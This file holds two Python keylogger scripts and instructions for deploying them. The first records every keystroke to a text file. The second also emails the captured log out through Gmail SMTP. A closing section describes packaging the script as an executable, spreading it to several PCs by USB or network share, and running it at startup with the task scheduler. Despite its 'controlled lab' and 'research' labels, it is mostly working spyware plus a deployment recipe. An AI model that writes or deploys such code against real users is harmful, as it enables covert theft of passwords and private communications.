# KEYLOG
# CODE 1


from pynput import keyboard

log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")  # Logs characters
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" {key} ")  # Logs special keys

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



# <!--Step on how to use--!>
Run this in a controlled lab environment.
Analyze the logs and understand how keyloggers store data.
Study detection methods like behavioral analysis, process monitoring, and anti-keylogging software.



# CODE 2

import smtplib
from email.message import EmailMessage
from pynput import keyboard

LOG_FILE = "keystrokes.txt"
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password"  # Use App Passwords for security!

def send_email():
    with open(LOG_FILE, "r") as file:
        data = file.read()

    msg = EmailMessage()
    msg.set_content(data)
    msg["Subject"] = "Keystroke Logs"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS  # Send to yourself or another test email

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as file:
            file.write(f" {key} ")

# Automatically send logs every few minutes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    send_email()






# Step 2:
After the code we can use this step

# Deploying on Multiple PCs (For Research)
# Convert the script into an executable (.exe) using pyinstaller:

pyinstaller --onefile keylogger.py

# Store it on a USB drive or deploy via network sharing.
# Use task scheduling (Windows Task Scheduler, crontab) to run it at startup.



